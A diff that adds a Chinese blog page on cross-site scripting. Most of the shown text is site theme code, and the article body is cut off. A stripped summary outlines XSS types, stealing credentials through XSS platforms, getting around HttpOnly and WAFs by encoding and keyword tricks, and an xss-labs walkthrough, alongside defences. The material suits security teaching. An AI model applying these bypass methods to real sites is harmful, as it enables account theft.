@@ -1,0 +1,724 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>XSS | CCB</title><meta name="keywords" content="渗透测试"><meta name="author" content="ccb"><meta name="copyright" content="ccb"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="XSS"><meta name="application-name" content="XSS"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="XSS"><meta property="og:url" content="https://frankcao3.github.io/posts/[object%20Object]/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/4.%20XSS/undefined.html"><meta property="og:site_name" content="CCB"><meta property="og:description" content="XSS 概述XSS 攻击全称跨站脚本攻击Cross Site Scripting。是指用户在 Web 页面中提交恶意脚本，从而使浏览包含恶意脚本的页面的用户在不知情的情况下执行该脚本，导致被攻击的行为。通常出现在搜索框、留言板、评论区等地方。 与 SQL 注入类似，XSS 也是利用提交恶意信息来实现"><meta property="og:locale" content="en"><meta property="og:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta property="article:author" content="ccb"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta name="description" content="XSS 概述XSS 攻击全称跨站脚本攻击Cross Site Scripting。是指用户在 Web 页面中提交恶意脚本，从而使浏览包含恶意脚本的页面的用户在不知情的情况下执行该脚本，导致被攻击的行为。通常出现在搜索框、留言板、评论区等地方。 与 SQL 注入类似，XSS 也是利用提交恶意信息来实现"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="https://frankcao3.github.io/posts/[object%20Object]/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/4.%20XSS/undefined"><link rel="preconnect" href="//cdn.cbd.int"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.20/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  linkPageTop: undefined,
+  peoplecanvas: {"enable":true,"img":"https://upload-bbs.miyoushe.com/upload/2023/09/03/125766904/ee23df8517f3c3e3efc4145658269c06_5714860933110284659.png"},
+  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
+  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
+  LA51: undefined,
+  greetingBox: undefined,
+  twikooEnvId: '',
+  commentBarrageConfig:undefined,
+  root: '/',
+  preloader: {"source":3},
+  friends_vue_info: undefined,
+  navMusic: true,
+  mainTone: undefined,
+  authorStatus: undefined,
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
+  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    simplehomepage: true,
+    post: false
+  },
+  runtime: 'days',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"Author: ccb","link":"Link: ","source":"Source: CCB","info":"Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source.","copySuccess":"Copy success, copy and reprint please mark the address of this article"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"Traditional Chinese Activated Manually","cht_to_chs":"Simplified Chinese Activated Manually","day_to_night":"Dark Mode Activated Manually","night_to_day":"Light Mode Activated Manually","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
+      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false,
+  shortcutKey: undefined,
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  configTitle: 'CCB',
+  title: 'XSS',
+  postAI: '',
+  pageFillDescription: 'XSS, 概述, 危害, 常用攻击语句, 分类, 反弹型 XSS（非持续型）, 存储型 XSS（持续型）, DOM 型 XSS（DOM）, XSS攻击过程, XSS自动化工具, XSS防护建议, HttpOnly的绕过, 常规WAF绕过思路, 黑名单（大小写绕过）, 删除黑名单字段（重复数据绕过）, 特殊符号干扰, 标签语法替换, 字符长度限制绕过, 提交方式更改, 垃圾数据溢出, 编码转换（编码绕过）, 内置函数转义（难绕过）, 实验, level 1, level 2, level 3, level 4, level 5, level 6, level 7, level 8, level 9, level 10, level 11, level 12, level 13, level 14, level 15, level 16, level 17-20概述攻击全称跨站脚本攻击是指用户在页面中提交恶意脚本从而使浏览包含恶意脚本的页面的用户在不知情的情况下执行该脚本导致被攻击的行为通常出现在搜索框留言板评论区等地方与注入类似也是利用提交恶意信息来实现攻击效果的攻击行为但是一般提交的是脚本运行在前端也就是用户的浏览器而注入提交的指令是在后台数据库服务器执行所以两者攻击的对象是不一样的攻击流程如下攻击者对含有漏洞的服务器发起攻击注入代码诱使受害者打开受到攻击的服务器受害者在浏览器中打开恶意脚本执行本质前端对于用户提交的参数没有审查就用于页面加载产生层面前端浏览器攻击目标是通过前端脚本获取用户的数据常用的函数类输出类攻击成功与否受浏览器内核影响一些高版本浏览器内核会主动过滤恶意脚本阻止攻击通常在攻击中攻击者会通过邮件或其他方式诱使用户点击包含恶意代码的链接例如攻击者通过向用户发送一个包含恶意代码的网站用户点击链接后浏览器会在用户毫不知情的情况下执行链接中包含的恶意代码将用户与交互的和等信息发送给攻击者攻击者拿到这些数据之后就会伪装成用户与真正的网站进行会话从事非法活动其过程如下图所示危害受脚本的功能决定挂马挖矿盗取用户拒绝服务客户端浏览器钓鱼攻击高级的钓鱼技巧恶意篡改页面劫持用户行为甚至进一步渗透内网爆发蠕虫蠕虫式的攻击蠕虫式挂马攻击植入广告或者发送垃圾信息刷浏量破坏网上数据其它安全问题常用攻击语句一般会借助标签的一些触发事件来执行攻击脚本标签在页面中插入一段标签标签支持事件属性在装载文档或图像的过程中如果发生了错误就会触发事件利用的特性来完成标签标签支持时间属性页面结束加载之后触发超链接标签解析所指链接此处作用是发生动作时执行一段代码标签标签标签浏览器执行编码绕过标签标签标签标签编码解码标签分类反弹型非持续型过程参数发包携带该参数执行在前端执行回包反射型是指恶意的攻击脚本包含在中只有当用户主动访问了包含恶意脚本的脚本才会被成功执行反射型的攻击攻击脚本经过后台服务器但是不会写入网站的数据库是一次性的攻击所以黑客一般需要诱骗用户点击包含攻击脚本的钓鱼邮件才能攻击成功比如在请求中构造攻击语句输出用户在该网站的参数为数值的话就不加引号该语句输出到页面的就变为存储型持续型过程参数发包携带该参数执行被写入数据库他人访问页面执行回包在前端被执行存储型则是把攻击脚本提交到网站后台数据库只要有人访问了显示该数据内容的页面就会被攻击存储型又称持久型攻击脚本将被永久地存放在目标服务器的数据库或文件中可能存在于一些我们信任的网站具有很高的隐蔽性攻击方式这种攻击多见于论坛博客和留言板攻击者在发帖的过程中将恶意脚本连同正常信息一起注入帖子的内容中随着帖子被服务器存储下来恶意脚本也永久地被存放在服务器的后端存储器中当其他用户浏览这个被注入了恶意脚本的帖子时恶意脚本会在他们的浏览器中得到执行相对于反射型存储型的成功率更高比如下面的网站有留言板功能尝试在框或者框提交弹窗脚本输出当前可以构造如下攻击语句网站在回显我的留言时脚本就会在中执行型过程参数然后发包携带该参数执行本地浏览器前端代码在前端被执行回包全称使用可以使程序和脚本能够动态访问和更新文档的内容结构及样式根据用户在页面的操作或提交的参数对网页进行动态更新比如点击查看更多在页面输入内容后立即回显在页面等的标签都是节点而这些节点组成了的整体结构节点树通过树中的所有节点均可通过进行访问所有元素节点均可被修改也可以创建或删除节点树结构如图所示在网站页面中有许多元素当页面到达浏览器时浏览器会为页面创建一个顶级的文档对象接着生成各个子文档对象每个页面元素对应一个文档对象每个文档对象包含属性方法和事件可以通过脚本对文档对象进行编辑从而修改页面的元素也就是说客户端的脚本程序可以通过动态修改页面内容从客户端获取中的数据并在本地执行型型是指基于文档对象模型的攻击攻击的输出点就位于对象上如等等是一种特殊类型的反射型由于是在客户端修改节点的所以基于型的漏洞不需要与服务器端交互它只发生在客户端处理数据的阶段攻击方式用户请求一个经过专门设计的它由攻击者提交而且其中包含代码服务器的响应不会以任何形式包含攻击者的脚本当用户的浏览器处理这个响应时对象就会处理代码在本地浏览器前端执行攻击脚本导致存在漏洞举例比如下面的网站功能是选择一种语言会以请求接收参数并且在前端回显会在中用到所提交的参数查看页面代码发现的值被用于以的方式来写入网页使网页显示所选的由此确定页面的方式为型对客户端网页进行了访问和更新在后直接加入攻击脚本即可实现攻击有时需要查看页面源码考虑闭合语法比如当使用标签进行攻击时攻击脚本应为以闭合和标签防御比如用户输入的参数被用于如下代码造成型的为了防御这种可以采用编码的方法在输出到时应该执行一次其次在输出到页面时要分具体情况看待如果是输出到事件或者脚本则要再做一次如果是输出到内容或者属性则要做一次以免又被自动解码执行两次编码也就是说从输出到页面也相当于一次输出的过程需要分语境使用不同的编码函数攻击过程寻找目标网站有注册输入栏留言板之类的网站能回显输入也就是会在中用到输入的参数尝试提交攻击脚本探查过滤规则确定可行的攻击语句可以使用自己构造的攻击语句也可以搜索平台借助平台构造所需要功能的攻击语句比如等一般平台构造的语句中含有平台的链接受害者执行攻击脚本中的该链接导致然后在平台可以查看到相应的执行结果查看网页元素确定脚本执行情况攻击脚本执行成功后查看平台获取到浏览器信息比如根据获得的信息进行进一步攻击比如是网站的管理员执行了受到攻击那么就能获取到管理员的用户凭据通过凭据可以判断对方身份信息存储本地存活时间较长常用于小中型网站账号登录会话存储服务器占用服务器资源存活时间较短常用于大型网站支付自动化工具主要支持反射和支持扫描多线程爬虫分析可配置的核心检测和规避老旧的库扫描智能生成器手工制作的解析器强大的引擎盲打支持高效的工作流完整的支持支持编码常用命令显示帮助信息指定目标方式提交内容详细输出加载自定义字典定义线程数爬行深度定义编码方式将数据视为测试路径组件从文件中测试抓取测试过滤器和应用程序防火墙更新设置超时时间防止拦截指定参数爬行使用代理盲测试跳过确认提示跳过扫描提供标头设置延迟使用流程运行工具攻击语句扫描确定网站会过滤哪些语句哪些语句又不会被拦截说明是离线的状态这里是因为该工具为外国开发识别不到安全狗为没有拦截为有过滤测试扫描结果选择攻击语句选择一个不会被拦截的攻击语句在浏览器中进行攻击有可能出现请求过于频繁被网站拦截对于拦截请求频繁被攻击拦截后重启靶场即可实际进行网站测试时可以现在本地搭建环境测试那些语句不会拦截在进行漏洞测试还有一种方法用代理比较麻烦或者直接自动攻击配合字典进行模糊测试在线工具用于自动生成各种攻击配合进行攻击参数作为变量选择字典文件不同的执行结果返回的网页数据包长度会不同这里数据包更大的表示攻击失败是一个写的自动绕过工具上一个版本是相比更智能可无人干预自动暴破防护建议代码过滤黑名单包括查询关键字头数据等仅接受指定长度范围格式适当符合预期的内容对其他不符合预期的内容一律进行过滤如果您在中设置了属性那么通过脚本将无法读取到信息唯一的作用这样能有效的防止攻击但是并不能防止漏洞只能是防止被盗取一般除了开启还会同时将用户所提供的内容输入输出进行过滤许多语言都有提供对的过滤对于而言可以在文件内修改可以在网页代码中开启还可以在输入输出进行关键字大小写特殊符号过滤等等比如的和这两个函数可以把字符转换为实体使得攻击代码失效的对一段指定的字符串应用编码对于而言是一个开发的安全组件首先应当配置过滤器注意在过滤器中方法中的对象进行包装在包装类中对请求参数进行筛选操作其次将过滤器注册到文件中最后配置的包装类在其中对请求信息进行过滤可以选择使用安全策略是一种白名单防御策略所有不在名单内的资源都不被信任有效的防止了通过外部的标签脚本文件等资源的入侵形式的绕过若浏览器未保存帐号密码利用表单劫持得到用户输入的账号密码并抄送到平台上去再应用到攻击中前提条件明文密码前提条件存在于登录框才行比较鸡肋若浏览器保存帐号密码浏览器读取帐号密码根据表单配置平台然后写入代码确定注册时的表单属性信息在平台创建一个项目点击配置选择获取浏览器保存的账号密码按照网站的表单信息填写相应的属性配置完成后按照平台提供的攻击语句在浏览器执行攻击比如常规绕过思路常见过滤的标签黑名单大小写绕过过滤单引号双引号开头的单词等非法字符比如过滤但是没有考虑大小写删除黑名单字段重复数据绕过尝试在中再嵌套一个绕过特殊符号干扰引号闭合参数不要如果对进行了过滤无法使用可以用引号闭合链接对于来自平台的含有的恶意链接比如是有可能成功攻击的干扰标签语法替换使用代码代表任意字符代表匹配前一个字符或无限次其中函数可以调用正则表达式进行的逐字检查并通过来不区分大小写但是上述代码只考虑了标签的其实脚本不仅仅可以在标签中使用通过标签中行为也可以调用脚本提交攻击成功也可尝试更多其他标签比如等字符长度限制绕过如果只是在浏览器前端进行的字符长度限制那么要么禁用或者修改前端的相关脚本要么绕过前端在中修改数据包就可以轻松绕过限制提交方式更改不行换比如安全狗的部分拦截仅针对进行检测更换为提交后成功执行有时也可以选择头部进行注入表示本网页的上一个这里的攻击语句首先使用引号闭合语法然后定义为使得能够显示攻击成功网页上出现弹框垃圾数据溢出在脚本末尾加上大量无关字符导致过滤条件失效注意最后要加上注释或者或者需要自己试特殊符号干扰比如编码转换编码绕过对输入到页面的数据进行编码转换使得攻击语句的某些特殊字符被编码攻击失效绕过时对攻击语句也主动进行编码即可网站发现这些字符已经被编码会自动对某些编码进行解码包括编码实体编码编码编码提供了四种编码策略三个八进制数字如果个数不够在前面补比如的编码为两个十六进制数字如果个数不够在前面补比如的编码为四个十六进制数字如果个数不够在前面补比如的编码为对于一些控制字符使用特殊的类型的转义风格实体编码命名实体以开头以分号结尾例如的编码是字符编码十进制十六进制码或字符编码样式为数值例如的编码是和编码由于网页会对进行一次解码所以使用编码绕过时有时需要进行两次编码所以在使用编码测试时需要考虑的渲染顺序选择合适的编码方式进行测试针对不同的产品有不同的编码绕过方法针对使用无空格绕过针对使用数字符编码绕过针对使用数字符编码绕过针对使用黑名单中缺少的混淆函数调用内置函数转义难绕过使用函数对提交的信息进行转义该函数会将所有特殊字符转义为实体比如把转义为把转义为只要正确的使用该函数攻击就可以彻底杜绝实验通关大合集所输入的值会回显在中因此直接插入上述语句是标准模板后面的关卡均可以先输入上述内容来判断所使用的防御手段在中的内容被实体编码了但在中没有因此在中插入但是注意闭合以及注释效果如下在以及中的内容均被实体编码无法使用因此使用的特殊事件来触发的可以不闭合效果如下输入后再点击输入框即可出发事件第三关的单引号闭合换为双引号经过尝试发现均被注释掉了使用标签使用效果如下页面会增加一个显示为的超链接点击即可触发代码经过尝试发现和均被过滤使用大小写绕过使用效果如下页面会增加一个显示为的超链接点击即可触发代码的值未被实体编码但是若提交的内容中有会被替换为空双写绕过引号均被实体编码又被过滤只能使用编码绕过将中的转化为实体编码在第关的基础上强制输入的内容要带有不然报错页面上没有输入框检查源码发现有三个尝试输入发现只有会回显效果如下输入后再点击页面即可触发事件与第关的区别是双引号被实体编码了但是可以看到多了一个名为的标签该标签的值也无法通过方法赋予但是根据名称猜测来自抓包修改发现响应体中的确实与请求头的字段的值相同使用或者提交即可效果如下与第关原理相同只不过回显的字段从换成了与第关原理相同只不过回显的字段从换成了传入参数的值会被用于查看页面指令用于包含外部的文件包含的内容将作为指定元素的子节点如果单纯指定地址必须要加引号加载外部标签中的内容不执行加载外部中含有标签样式可以识别属性的值可以是一个表达式返回一个文件名默认情况下包含的文件需要包含在同一个域名下尝试通用的攻击语句发现双引号被过滤被实体编码只能使用其他语句加载同一域名下的外部文件同时传入参数这样该页面就会包含并传入参数由于在解析时出错所以触发尝试如下语句发现被注释空格和均被转义尝试使用替换空格与文件相关',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-10-05 20:00:44',
+  postMainColor: '',
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="CCB" type="application/atom+xml">
+</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.getElementById('loading-box').classList.add("loaded");
+  },
+  initLoading: () => {
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+setTimeout(function(){preloader.endLoading();},10000)
+
+if (true) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">CCB</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> Newest Comments</span></div><div class="aside-list"><span>loading...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/DVWA%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">DVWA靶场<sup>10</sup></a><a href="/tags/%E5%AE%9E%E8%AE%AD-%E7%BD%91%E7%BB%9C%E5%BB%BA%E8%AE%BE%E9%83%A8%E5%88%86/" style="font-size: 1.05rem;">实训-网络建设部分<sup>7</sup></a><a href="/tags/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/" style="font-size: 1.05rem;">搭建博客<sup>1</sup></a><a href="/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/" style="font-size: 1.05rem;">机器学习<sup>1</sup></a><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 1.05rem;">渗透测试<sup>15</sup></a><a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/" style="font-size: 1.05rem;">计算机基础<sup>5</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>Archives</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/10/"><span class="card-archive-list-date">October 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/08/"><span class="card-archive-list-date">August 2022</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">15</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/07/"><span class="card-archive-list-date">July 2022</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2021/08/"><span class="card-archive-list-date">August 2021</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2020/08/"><span class="card-archive-list-date">August 2020</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">19</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item on" id="consoleCommentBarrage" onclick="anzhiyu.switchCommentBarrage()" title="热评开关"><a class="commentBarrage"><i class="anzhiyufont anzhiyu-icon-message"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="article-meta tags"><a class="article-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>渗透测试</span></a></span></div></div><h1 class="post-title" itemprop="name headline">XSS</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2022-08-04T16:00:00.000Z" title="Created 2022-08-05 00:00:00">2022-08-05</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2023-10-05T12:00:44.303Z" title="Updated 2023-10-05 20:00:44">2023-10-05</time></span></div><div class="meta-secondline"><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为长沙"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>长沙</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="https://frankcao3.github.io/posts/[object%20Object]/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/4.%20XSS/undefined"><header><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" tabindex="-1" itemprop="url">渗透测试</a><h1 id="CrawlerTitle" itemprop="name headline">XSS</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">ccb</span><time itemprop="dateCreated datePublished" datetime="2022-08-04T16:00:00.000Z" title="Created 2022-08-05 00:00:00">2022-08-05</time><time itemprop="dateCreated datePublished" datetime="2023-10-05T12:00:44.303Z" title="Updated 2023-10-05 20:00:44">2023-10-05</time></header><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" 